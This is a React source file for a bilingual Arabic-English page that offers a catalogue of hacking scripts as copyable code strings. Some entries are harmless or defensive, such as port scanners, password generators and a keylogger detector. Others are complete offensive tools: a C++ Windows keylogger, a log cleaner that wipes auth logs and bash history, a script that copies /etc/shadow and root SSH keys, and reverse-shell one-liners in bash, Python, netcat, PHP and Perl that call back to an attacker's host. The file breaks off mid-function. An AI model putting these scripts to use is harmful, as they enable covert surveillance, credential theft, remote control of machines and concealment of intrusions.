import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { Code, Copy, Check, Globe, Terminal, FileCode, Hash, Network, Search, Key, Shield, Mail, Link, Wifi, Eye, Lock, FileText, Bug, Database, Server, Skull, Cpu, HardDrive, AlertTriangle, Binary } from "lucide-react";
import { useState } from "react";

import { LucideIcon } from "lucide-react";

interface Script {
  name: { ar: string; en: string };
  description: { ar: string; en: string };
  language: "Python" | "C++" | "C" | "Bash" | "JavaScript" | "Assembly" | "Java" | "C#";
  code: string;
  icon?: LucideIcon;
}

const getScriptIcon = (name: string): LucideIcon => {
  const lowerName = name.toLowerCase();
  if (lowerName.includes("port") || lowerName.includes("scan")) return Network;
  if (lowerName.includes("hash") || lowerName.includes("crack")) return Hash;
  if (lowerName.includes("password") || lowerName.includes("مرور")) return Key;
  if (lowerName.includes("subdomain") || lowerName.includes("نطاق")) return Search;
  if (lowerName.includes("network") || lowerName.includes("شبكة")) return Wifi;
  if (lowerName.includes("keylogger")) return Eye;
  if (lowerName.includes("email") || lowerName.includes("بريد")) return Mail;
  if (lowerName.includes("url") || lowerName.includes("رابط")) return Link;
  if (lowerName.includes("encrypt") || lowerName.includes("تشفير")) return Lock;
  if (lowerName.includes("file") || lowerName.includes("ملف")) return FileText;
  if (lowerName.includes("shell") || lowerName.includes("reverse")) return Terminal;
  if (lowerName.includes("process") || lowerName.includes("عملي")) return Cpu;
  if (lowerName.includes("firewall") || lowerName.includes("جدار")) return Shield;
  if (lowerName.includes("system") || lowerName.includes("نظام")) return HardDrive;
  if (lowerName.includes("log") || lowerName.includes("سجل")) return FileCode;
  if (lowerName.includes("extract") || lowerName.includes("استخراج")) return Database;
  return Code;
};

const scripts: Script[] = [
  // Python Scripts
  {
    name: { ar: "ماسح المنافذ", en: "Port Scanner" },
    description: { ar: "ماسح منافذ بسيط وسريع", en: "Simple and fast port scanner" },
    language: "Python",
    code: `import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is OPEN")
        sock.close()
    except:
        pass

def main():
    target = input("Enter target IP: ")
    print(f"\\nScanning {target}...\\n")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1, 1025):
            executor.submit(scan_port, target, port)

if __name__ == "__main__":
    main()`,
  },
  {
    name: { ar: "كاسر الهاش", en: "Hash Cracker" },
    description: { ar: "أداة لكسر الهاش باستخدام قائمة كلمات", en: "Hash cracking tool with wordlist" },
    language: "Python",
    code: `import hashlib

def crack_hash(target_hash, wordlist, hash_type="md5"):
    hash_funcs = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256
    }
    
    if hash_type not in hash_funcs:
        print("Unsupported hash type")
        return None
    
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for word in f:
            word = word.strip()
            hashed = hash_funcs[hash_type](word.encode()).hexdigest()
            if hashed == target_hash:
                print(f"[+] Found: {word}")
                return word
    
    print("[-] Password not found")
    return None

# Usage
# crack_hash("5d41402abc4b2a76b9719d911017c592", "rockyou.txt", "md5")`,
  },
  {
    name: { ar: "مكتشف النطاقات الفرعية", en: "Subdomain Finder" },
    description: { ar: "اكتشاف النطاقات الفرعية", en: "Discover subdomains" },
    language: "Python",
    code: `import requests
import concurrent.futures

subdomains = [
    "www", "mail", "ftp", "admin", "blog", "shop", "api",
    "dev", "test", "staging", "app", "mobile", "cdn", "vpn",
    "portal", "secure", "login", "dashboard", "panel", "cpanel"
]

def check_subdomain(subdomain, domain):
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=3)
        print(f"[+] Found: {url} ({response.status_code})")
        return url
    except:
        return None

def find_subdomains(domain):
    print(f"\\nScanning subdomains for {domain}...\\n")
    found = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
    
    print(f"\\n[*] Found {len(found)} subdomains")
    return found

# Usage: find_subdomains("example.com")`,
  },
  {
    name: { ar: "ماسح الشبكة", en: "Network Scanner" },
    description: { ar: "مسح الأجهزة في الشبكة المحلية", en: "Scan local network devices" },
    language: "Python",
    code: `from scapy.all import ARP, Ether, srp
import sys

def scan_network(ip_range):
    print(f"\\nScanning network: {ip_range}\\n")
    print("-" * 50)
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print("-" * 50)
    
    # Create ARP request
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send and receive
    result = srp(packet, timeout=3, verbose=0)[0]
    
    devices = []
    for sent, received in result:
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"{received.psrc:<20} {received.hwsrc:<20}")
    
    print("-" * 50)
    print(f"\\n[*] Found {len(devices)} devices")
    return devices

# Usage: scan_network("192.168.1.0/24")`,
  },
  {
    name: { ar: "كاشف Keylogger", en: "Keylogger Detector" },
    description: { ar: "كشف برامج التجسس على لوحة المفاتيح", en: "Detect keyboard spyware" },
    language: "Python",
    code: `import psutil
import os

suspicious_names = [
    "keylogger", "logger", "hook", "capture", "spy",
    "monitor", "record", "keystroke", "input"
]

def detect_keyloggers():
    print("\\n[*] Scanning for suspicious processes...\\n")
    
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            name = proc.info['name'].lower()
            for keyword in suspicious_names:
                if keyword in name:
                    suspicious.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'path': proc.info['exe']
                    })
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    
    if suspicious:
        print("[!] Suspicious processes found:")
        for proc in suspicious:
            print(f"  PID: {proc['pid']}, Name: {proc['name']}")
            print(f"  Path: {proc['path']}\\n")
    else:
        print("[+] No suspicious keylogger processes detected")
    
    return suspicious

detect_keyloggers()`,
  },
  {
    name: { ar: "مولد كلمات المرور", en: "Password Generator" },
    description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
    language: "Python",
    code: `import random
import string

def generate_password(length=16, use_special=True):
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    
    password = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
    return password

def generate_wordlist(count=100, min_len=8, max_len=16):
    wordlist = []
    for _ in range(count):
        length = random.randint(min_len, max_len)
        wordlist.append(generate_password(length))
    return wordlist

# Generate 5 passwords
print("Generated Passwords:")
for i in range(5):
    print(f"  {i+1}. {generate_password(20)}")`,
  },
  {
    name: { ar: "مستخرج البريد الإلكتروني", en: "Email Extractor" },
    description: { ar: "استخراج الإيميلات من صفحات الويب", en: "Extract emails from web pages" },
    language: "Python",
    code: `import re
import requests
from bs4 import BeautifulSoup

def extract_emails(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
        
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = set(re.findall(email_pattern, text))
        
        print(f"\\n[*] Found {len(emails)} emails on {url}:\\n")
        for email in sorted(emails):
            print(f"  {email}")
        
        return list(emails)
    except Exception as e:
        print(f"Error: {e}")
        return []

# Usage: extract_emails("https://example.com")`,
  },
  {
    name: { ar: "فاحص الروابط", en: "URL Checker" },
    description: { ar: "فحص حالة الروابط والسيرفرات", en: "Check URL and server status" },
    language: "Python",
    code: `import requests
import ssl
import socket

def check_url(url):
    print(f"\\n[*] Checking {url}...\\n")
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Final URL: {response.url}")
        print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
        print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
        
        # Check SSL
        if url.startswith('https'):
            hostname = url.split('/')[2]
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
                s.connect((hostname, 443))
                cert = s.getpeercert()
                print(f"[+] SSL Valid Until: {cert['notAfter']}")
        
        return response.status_code
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Usage: check_url("https://google.com")`,
  },
  // C++ Scripts
  {
    name: { ar: "ماسح المنافذ (C++)", en: "Port Scanner (C++)" },
    description: { ar: "ماسح منافذ سريع بلغة C++", en: "Fast port scanner in C++" },
    language: "C++",
    code: `#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

void scan_port(const char* ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;
    
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    DWORD timeout = 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        std::cout << "[+] Port " << port << " is OPEN" << std::endl;
    }
    closesocket(sock);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    std::string target;
    std::cout << "Enter target IP: ";
    std::cin >> target;
    
    std::cout << "\\nScanning " << target << "...\\n" << std::endl;
    
    std::vector<std::thread> threads;
    for (int port = 1; port <= 1024; port++) {
        threads.emplace_back(scan_port, target.c_str(), port);
    }
    
    for (auto& t : threads) t.join();
    
    WSACleanup();
    return 0;
}`,
  },
  {
    name: { ar: "مولد كلمات المرور (C++)", en: "Password Generator (C++)" },
    description: { ar: "مولد كلمات مرور قوية", en: "Strong password generator" },
    language: "C++",
    code: `#include <iostream>
#include <string>
#include <random>
#include <ctime>

std::string generate_password(int length, bool upper, bool lower, 
                               bool digits, bool special) {
    std::string charset = "";
    if (upper)   charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if (lower)   charset += "abcdefghijklmnopqrstuvwxyz";
    if (digits)  charset += "0123456789";
    if (special) charset += "!@#$%^&*()_+-=[]{}|;:,.<>?";
    
    if (charset.empty()) {
        return "Error: No character set selected";
    }
    
    std::mt19937 rng(std::time(nullptr));
    std::uniform_int_distribution<int> dist(0, charset.length() - 1);
    
    std::string password = "";
    for (int i = 0; i < length; i++) {
        password += charset[dist(rng)];
    }
    
    return password;
}

int main() {
    int length;
    std::cout << "Password length: ";
    std::cin >> length;
    
    std::cout << "\\nGenerated passwords:\\n" << std::endl;
    
    for (int i = 0; i < 5; i++) {
        std::string pwd = generate_password(length, true, true, true, true);
        std::cout << "  " << i+1 << ". " << pwd << std::endl;
    }
    
    return 0;
}`,
  },
  {
    name: { ar: "مشفر الملفات (C++)", en: "File Encryptor (C++)" },
    description: { ar: "تشفير الملفات باستخدام XOR", en: "XOR file encryption" },
    language: "C++",
    code: `#include <iostream>
#include <fstream>
#include <string>
#include <vector>

void xor_encrypt(const std::string& input_file, 
                 const std::string& output_file,
                 const std::string& key) {
    std::ifstream in(input_file, std::ios::binary);
    std::ofstream out(output_file, std::ios::binary);
    
    if (!in.is_open() || !out.is_open()) {
        std::cerr << "Error opening files!" << std::endl;
        return;
    }
    
    char byte;
    size_t key_index = 0;
    
    while (in.get(byte)) {
        byte ^= key[key_index % key.length()];
        out.put(byte);
        key_index++;
    }
    
    in.close();
    out.close();
    
    std::cout << "[+] File encrypted successfully!" << std::endl;
    std::cout << "[*] Output: " << output_file << std::endl;
}

int main() {
    std::string input, output, key;
    
    std::cout << "Input file: ";
    std::cin >> input;
    
    std::cout << "Output file: ";
    std::cin >> output;
    
    std::cout << "Encryption key: ";
    std::cin >> key;
    
    xor_encrypt(input, output, key);
    
    return 0;
}`,
  },
  {
    name: { ar: "Keylogger بسيط (C++)", en: "Simple Keylogger (C++)" },
    description: { ar: "مسجل ضغطات لوحة المفاتيح للتعليم", en: "Educational keyboard logger" },
    language: "C++",
    code: `#include <iostream>
#include <fstream>
#include <windows.h>

// WARNING: For educational purposes only!
// Use only on systems you own or have permission to test.

std::string get_key_name(int key) {
    switch(key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";
        case VK_CONTROL: return "[CTRL]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        default:
            if (key >= 0x30 && key <= 0x5A) {
                char c = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                if (!(GetKeyState(VK_SHIFT) & 0x8000) && c >= 'A' && c <= 'Z')
                    c += 32; // lowercase
                return std::string(1, c);
            }
            return "";
    }
}

int main() {
    std::ofstream log("keylog.txt", std::ios::app);
    
    std::cout << "[*] Keylogger started (Press ESC to stop)" << std::endl;
    std::cout << "[*] Logging to keylog.txt" << std::endl;
    
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                std::string output = get_key_name(key);
                if (!output.empty()) {
                    std::cout << output;
                    log << output;
                    log.flush();
                }
                if (key == VK_ESCAPE) {
                    log.close();
                    return 0;
                }
            }
        }
        Sleep(10);
    }
    return 0;
}`,
  },
  // Bash Scripts
  {
    name: { ar: "جامع معلومات النظام", en: "System Info Collector" },
    description: { ar: "جمع معلومات النظام", en: "Collect system information" },
    language: "Bash",
    code: `#!/bin/bash

echo "========================================="
echo "       SYSTEM INFORMATION COLLECTOR      "
echo "========================================="
echo ""

echo "[+] Hostname: $(hostname)"
echo "[+] User: $(whoami)"
echo "[+] OS: $(uname -a)"
echo ""

echo "[+] Network Interfaces:"
ip addr | grep -E "inet " | awk '{print "    " $2}'
echo ""

echo "[+] Open Ports:"
netstat -tuln 2>/dev/null | grep LISTEN | awk '{print "    " $4}'
echo ""

echo "[+] Running Services:"
systemctl list-units --type=service --state=running | head -20
echo ""

echo "[+] Last 5 Logins:"
last -5
echo ""

echo "[+] Disk Usage:"
df -h | grep -E "^/dev"
echo ""

echo "========================================="
echo "          Scan Complete                  "
echo "========================================="`,
  },
  {
    name: { ar: "نسخ احتياطي للجدار الناري", en: "Firewall Backup" },
    description: { ar: "نسخ احتياطي لقواعد الجدار الناري", en: "Backup firewall rules" },
    language: "Bash",
    code: `#!/bin/bash

BACKUP_DIR="/backup/firewall"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/iptables_backup_$DATE.rules"

# Create backup directory
mkdir -p $BACKUP_DIR

echo "[*] Creating firewall rules backup..."

# Backup iptables rules
iptables-save > $BACKUP_FILE

if [ $? -eq 0 ]; then
    echo "[+] Backup created: $BACKUP_FILE"
    echo "[+] File size: $(ls -lh $BACKUP_FILE | awk '{print $5}')"
    
    # Keep only last 10 backups
    cd $BACKUP_DIR
    ls -t | tail -n +11 | xargs -r rm --
    echo "[+] Old backups cleaned"
else
    echo "[-] Backup failed!"
    exit 1
fi

echo ""
echo "[*] Current rules count:"
echo "    IPv4: $(iptables -L -n | grep -c '^')"
echo "    IPv6: $(ip6tables -L -n | grep -c '^')"`,
  },
  {
    name: { ar: "ماسح الشبكة (Bash)", en: "Network Scanner (Bash)" },
    description: { ar: "مسح الشبكة المحلية", en: "Scan local network" },
    language: "Bash",
    code: `#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <network> (e.g., 192.168.1)"
    exit 1
fi

NETWORK=$1

echo "========================================="
echo "       NETWORK SCANNER                   "
echo "========================================="
echo ""
echo "[*] Scanning network: $NETWORK.0/24"
echo ""

for ip in $(seq 1 254); do
    (
        ping -c 1 -W 1 $NETWORK.$ip &>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Host found: $NETWORK.$ip"
            # Get hostname if possible
            hostname=$(host $NETWORK.$ip 2>/dev/null | grep "domain name pointer" | awk '{print $5}')
            if [ ! -z "$hostname" ]; then
                echo "    Hostname: $hostname"
            fi
        fi
    ) &
done

wait
echo ""
echo "[*] Scan complete"`,
  },
  {
    name: { ar: "مراقب العمليات", en: "Process Monitor" },
    description: { ar: "مراقبة العمليات المشبوهة", en: "Monitor suspicious processes" },
    language: "Bash",
    code: `#!/bin/bash

echo "========================================="
echo "       PROCESS MONITOR                   "
echo "========================================="

SUSPICIOUS=("nc" "ncat" "netcat" "python" "perl" "ruby" "bash -i" "sh -i")

echo ""
echo "[*] Checking for suspicious processes..."
echo ""

for proc in "\${SUSPICIOUS[@]}"; do
    result=$(ps aux | grep -i "$proc" | grep -v grep)
    if [ ! -z "$result" ]; then
        echo "[!] Suspicious process found: $proc"
        echo "$result" | while read line; do
            echo "    $line"
        done
        echo ""
    fi
done

echo ""
echo "[*] Network connections (ESTABLISHED):"
netstat -tunapl 2>/dev/null | grep ESTABLISHED | head -10

echo ""
echo "[*] Listening ports:"
netstat -tunapl 2>/dev/null | grep LISTEN | head -10

echo ""
echo "[*] Scan complete"`,
  },
  {
    name: { ar: "منظف السجلات", en: "Log Cleaner" },
    description: { ar: "تنظيف سجلات النظام", en: "Clean system logs" },
    language: "Bash",
    code: `#!/bin/bash

# WARNING: Use only on systems you own!
# For educational purposes only.

echo "========================================="
echo "       LOG CLEANER                       "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/messages"
    "/var/log/secure"
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
)

echo ""
echo "[*] Clearing log files..."

for log in "\${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        echo -n > "$log" 2>/dev/null
        echo "[+] Cleared: $log"
    fi
done

# Clear bash history
echo "[+] Clearing bash history..."
history -c
cat /dev/null > ~/.bash_history

echo ""
echo "[*] Log cleanup complete"`,
  },
  {
    name: { ar: "مستخرج كلمات المرور", en: "Password Extractor" },
    description: { ar: "استخراج الهاشات من النظام", en: "Extract system hashes" },
    language: "Bash",
    code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use on systems you have permission to test.

echo "========================================="
echo "       PASSWORD HASH EXTRACTOR           "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

OUTPUT_DIR="./extracted_hashes"
mkdir -p $OUTPUT_DIR

echo ""
echo "[*] Extracting password information..."

# Extract /etc/passwd
if [ -f /etc/passwd ]; then
    cp /etc/passwd $OUTPUT_DIR/passwd.txt
    echo "[+] Copied /etc/passwd"
fi

# Extract /etc/shadow
if [ -f /etc/shadow ]; then
    cp /etc/shadow $OUTPUT_DIR/shadow.txt
    echo "[+] Copied /etc/shadow"
fi

# Create unshadow file for John
if [ -f $OUTPUT_DIR/passwd.txt ] && [ -f $OUTPUT_DIR/shadow.txt ]; then
    unshadow $OUTPUT_DIR/passwd.txt $OUTPUT_DIR/shadow.txt > $OUTPUT_DIR/unshadowed.txt 2>/dev/null
    echo "[+] Created unshadowed file"
fi

# Extract SSH keys
if [ -d /root/.ssh ]; then
    cp -r /root/.ssh $OUTPUT_DIR/root_ssh 2>/dev/null
    echo "[+] Copied root SSH keys"
fi

echo ""
echo "[*] Extraction complete. Files saved to: $OUTPUT_DIR"`,
  },
  {
    name: { ar: "Reverse Shell", en: "Reverse Shell" },
    description: { ar: "اتصال عكسي للتحكم عن بعد", en: "Reverse connection for remote control" },
    language: "Bash",
    code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use in authorized penetration testing.

echo "========================================="
echo "       REVERSE SHELL GENERATOR           "
echo "========================================="

echo ""
read -p "Enter your IP address: " LHOST
read -p "Enter your listening port: " LPORT

echo ""
echo "[*] Reverse Shell One-Liners:"
echo ""

echo "=== Bash ===" 
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""

echo "=== Python ==="
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
echo ""

echo "=== Netcat ==="
echo "nc -e /bin/sh $LHOST $LPORT"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo ""

echo "=== PHP ==="
echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""

echo "=== Perl ==="
echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo ""

echo "[*] Start listener with: nc -lvnp $LPORT"`,
  },
  // JavaScript Scripts
  {
    name: { ar: "ماسح المنافذ (Node.js)", en: "Port Scanner (Node.js)" },
    description: { ar: "ماسح منافذ بسيط باستخدام Node.js", en: "Simple port scanner using Node.js" },
    language: "JavaScript",
    code: `const net = require('net');

async function scanPort(host, port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(1000);
    
    socket.on('connect', () => {
      console.log(\`[+] Port \${port} is OPEN\`);
      socket.destroy();
      resolve(true);
    });
    
    socket.on('timeout', () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.on('error', () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.connect(port, host);
  });
}

async function scan(host, startPort = 1, endPort = 1024) {
  console.log(\`\\nScanning \${host} from port \${startPort} to \${endPort}...\\n\`);
  
  for (let port = startPort; port <= endPort; port++) {
    await scanPort(host, port);
  }
  
  console.log('\\n[*] Scan complete');
}

// Usage: scan('127.0.0.1', 1, 100);
scan(process.argv[2] || '127.0.0.1');`,
  },
  {
    name: { ar: "مولد كلمات المرور (JS)", en: "Password Generator (JS)" },
    description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
    language: "JavaScript",
    code: `const crypto = require('crypto');

function generatePassword(length = 16, options = {}) {
  const {
    uppercase = true,
    lowercase = true,
    numbers = true,
    symbols = true
  } = options;
  
  let charset = '';
  if (uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if (lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
  if (numbers) charset += '0123456789';
  if (symbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
  
  if (!charset) return 'Error: No character set selected';
  
  const randomBytes = crypto.randomBytes(length);
  let password = '';
  
  for (let i = 0; i < length; i++) {
    password += charset[randomBytes[i] % charset.length];
  }
  
  return password;
}

// Calculate password strength
function checkStrength(password) {
  let score = 0;
  if (password.length >= 8) score++;
  if (password.length >= 12) score++;
  if (/[a-z]/.test(password)) score++;
  if (/[A-Z]/.test(password)) score++;
  if (/[0-9]/.test(password)) score++;
  if (/[^a-zA-Z0-9]/.test(password)) score++;
  
  const levels = ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong', 'Very Strong'];
  return levels[Math.min(score, 5)];
}

// Generate 5 passwords
console.log('Generated Passwords:\\n');
for (let i = 0; i < 5; i++) {
  const pwd = generatePassword(20);
  console.log(\`  \${i + 1}. \${pwd} [\${checkStrength(pwd)}]\`);
}`,
  },
  {
    name: { ar: "كاسر الهاش (JS)", en: "Hash Cracker (JS)" },
    description: { ar: "كسر هاشات MD5 و SHA", en: "Crack MD5 and SHA hashes" },
    language: "JavaScript",
    code: `const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');

async function crackHash(targetHash, wordlistPath, hashType = 'md5') {
  console.log(\`\\n[*] Attempting to crack \${hashType.toUpperCase()} hash...\`);
  console.log(\`[*] Target: \${targetHash}\\n\`);
  
  const fileStream = fs.createReadStream(wordlistPath);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });
  
  let attempts = 0;
  
  for await (const word of rl) {
    attempts++;
    const hash = crypto.createHash(hashType).update(word.trim()).digest('hex');
    
    if (hash === targetHash.toLowerCase()) {
      console.log(\`[+] Password found: \${word}\`);
      console.log(\`[+] Attempts: \${attempts}\`);
      return word;
    }
    
    if (attempts % 10000 === 0) {
      process.stdout.write(\`\\r[*] Tried \${attempts} passwords...\`);
    }
  }
  
  console.log(\`\\n[-] Password not found after \${attempts} attempts\`);
  return null;
}

// Example usage:
// crackHash('5d41402abc4b2a76b9719d911017c592', 'wordlist.txt', 'md5');

// Quick hash generator
function hashString(text, algorithm = 'md5') {
  return crypto.createHash(algorithm).update(text).digest('hex');
}

console.log('Hash Examples:');
console.log(\`MD5:    \${hashString('hello', 'md5')}\`);
console.log(\`SHA1:   \${hashString('hello', 'sha1')}\`);
console.log(\`SHA256: \${hashString('hello', 'sha256')}\`);`,
  },
  {
    name: { ar: "مستخرج الروابط", en: "Link Extractor" },
    description: { ar: "استخراج جميع الروابط من صفحة ويب", en: "Extract all links from a webpage" },
    language: "JavaScript",
    code: `const https = require('https');
const http = require('http');
const { URL } = require('url');

function extractLinks(targetUrl) {
  return new Promise((resolve, reject) => {
    const url = new URL(targetUrl);
    const client = url.protocol === 'https:' ? https : http;
    
    console.log(\`\\n[*] Fetching \${targetUrl}...\\n\`);
    
    client.get(targetUrl, (res) => {
      let html = '';
      
      res.on('data', (chunk) => html += chunk);
      res.on('end', () => {
        // Extract all href links
        const hrefRegex = /href=["']([^"']+)["']/gi;
        const srcRegex = /src=["']([^"']+)["']/gi;
        
        const links = new Set();
        let match;
        
        while ((match = hrefRegex.exec(html)) !== null) {
          links.add(match[1]);
        }
        while ((match = srcRegex.exec(html)) !== null) {
          links.add(match[1]);
        }
        
        const result = Array.from(links);
        
        console.log(\`[+] Found \${result.length} links:\\n\`);
        result.forEach((link, i) => {
          console.log(\`  \${i + 1}. \${link}\`);
        });
        
        resolve(result);
      });
    }).on('error', reject);
  });
}

// Usage: extractLinks('https://example.com');
const target = process.argv[2] || 'https://example.com';
extractLinks(target).catch(console.error);`,
  },
  {
    name: { ar: "فاحص HTTP Headers", en: "HTTP Headers Checker" },
    description: { ar: "فحص رؤوس HTTP للموقع", en: "Check website HTTP headers" },
    language: "JavaScript",
    code: `const https = require('https');
const http = require('http');
const { URL } = require('url');

function checkHeaders(targetUrl) {
  return new Promise((resolve, reject) => {
    const url = new URL(targetUrl);
    const client = url.protocol === 'https:' ? https : http;
    
    console.log(\`\\n[*] Checking headers for: \${targetUrl}\\n\`);
    console.log('='.repeat(50));
    
    client.get(targetUrl, (res) => {
      console.log(\`\\n[+] Status: \${res.statusCode} \${res.statusMessage}\\n\`);
      console.log('[+] Response Headers:\\n');
      
      const securityHeaders = [
        'content-security-policy',
        'x-frame-options',
        'x-xss-protection',
        'x-content-type-options',
        'strict-transport-security',
        'referrer-policy'
      ];
      
      Object.entries(res.headers).forEach(([key, value]) => {
        const isSecurityHeader = securityHeaders.includes(key.toLowerCase());
        const prefix = isSecurityHeader ? '[SECURITY]' : '          ';
        console.log(\`\${prefix} \${key}: \${value}\`);
      });
      
      // Check missing security headers
      console.log('\\n[*] Security Header Analysis:\\n');
      securityHeaders.forEach(header => {
        const exists = res.headers[header];
        const status = exists ? '[✓] Present' : '[✗] Missing';
        console.log(\`  \${status}: \${header}\`);
      });
      
      resolve(res.headers);
    }).on('error', reject);
  });
}

// Usage
const target = process.argv[2] || 'https://example.com';
checkHeaders(target).catch(console.error);`,
  },
  {
    name: { ar: "مشفر Base64", en: "Base64 Encoder/Decoder" },
    description: { ar: "تشفير وفك تشفير Base64", en: "Encode and decode Base64" },
    language: "JavaScript",
    code: `// Base64 Encoder/Decoder with multiple modes

function encode(text) {
  return Buffer.from(text).toString('base64');
}

function decode(base64) {
  return Buffer.from(base64, 'base64').toString('utf8');
}

function encodeUrl(text) {
  return Buffer.from(text).toString('base64url');
}

function decodeUrl(base64url) {
  return Buffer.from(base64url, 'base64url').toString('utf8');
}

// Encode file to base64
function encodeFile(filePath) {
  const fs = require('fs');
  const data = fs.readFileSync(filePath);
  return data.toString('base64');
}

// Interactive mode
const text = 'Hello, World! مرحبا بالعالم';

console.log('='.repeat(50));
console.log('       BASE64 ENCODER/DECODER');
console.log('='.repeat(50));
console.log(\`\\nOriginal: \${text}\`);
console.log('\\n[Encoding]');

const encoded = encode(text);
console.log(\`  Standard: \${encoded}\`);

const urlEncoded = encodeUrl(text);
console.log(\`  URL-Safe: \${urlEncoded}\`);

console.log('\\n[Decoding]');
console.log(\`  Decoded:  \${decode(encoded)}\`);

// XOR cipher for simple obfuscation
function xorCipher(text, key) {
  let result = '';
  for (let i = 0; i < text.length; i++) {
    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return encode(result);
}

console.log('\\n[XOR + Base64]');
const secret = xorCipher('secret message', 'key123');
console.log(\`  Encrypted: \${secret}\`);`,
  },
  {
    name: { ar: "منشئ Wordlist", en: "Wordlist Generator" },
    description: { ar: "إنشاء قوائم كلمات مرور مخصصة", en: "Generate custom password wordlists" },
    language: "JavaScript",
    code: `const fs = require('fs');

class WordlistGenerator {
  constructor() {
    this.words = new Set();
  }
  
  // Add base words
  addWords(words) {
    words.forEach(w => this.words.add(w));
  }
  
  // Add number variations
  addNumbers(word) {
    for (let i = 0; i <= 9999; i++) {
      this.words.add(word + i);
      this.words.add(i + word);
    }
  }
  
  // Add common substitutions
  addLeetSpeak(word) {
